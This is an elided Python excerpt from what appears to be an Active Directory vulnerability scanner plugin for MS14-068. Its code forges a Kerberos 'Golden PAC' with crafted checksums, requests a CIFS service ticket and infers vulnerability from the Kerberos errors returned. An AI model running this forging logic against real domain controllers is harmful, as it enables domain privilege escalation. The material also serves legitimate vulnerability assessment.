...
class PluginADMS14068(PluginADScanBase):
    ...
    def run_script(self, args) -> dict:
        dumper = MS14068(
            self.ldap_username,
            self.ldap_conf.get("password"),
            domain=self.dc_domain,
            target=self.dc_hostname,
            kdcHost=self.dc_ip,
        )
...
class MS14068:
    ...
    def getGoldenPAC(self, authTime):
        ...
        validationInfoBlob = (
            validationInfo.getData() + validationInfo.getDataReferents()
        )
        ...
        try:
            ...
            name = self.__username.decode(sys.getfilesystemencoding()).encode(
                "utf-16le"
            )
        ...
        buffers = (
            validationInfoIB.getData()
            + pacClientInfoIB.getData()
            + serverChecksumIB.getData()
            + privSvrChecksumIB.getData()
            + validationInfoBlob
            + validationInfoAlignment
            + pacClientInfo.getData()
            + pacClientInfoAlignment
        )
        buffersTail = (
            serverChecksum.getData()
            + serverChecksumAlignment
            + privSvrChecksum.getData()
    ...
    def getKerberosTGS(
        self, serverName, domain, kdcHost, tgt, cipher, sessionKey, authTime
    ):
        # Get out Golden PAC
    ...
    def check(self):
        ...
        try:
            ...
            for pa in asRep["padata"]:
                if (
                    ...
                    etype2 = decoder.decode(
                        pa["padata-value"][2:], asn1Spec=ETYPE_INFO2_ENTRY()
                    )[0]
            ...
            tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(
                serverName, self.__domain, self.__kdcHost, tgs, cipher, sessionKey
            )
        ...
        if exception is None:
            ...
            return 1, ""
        elif "KRB_ERR_GENERIC" in str(exception) or "KRB_AP_ERR_BAD_INTEGRITY" in str(
            exception
        ):
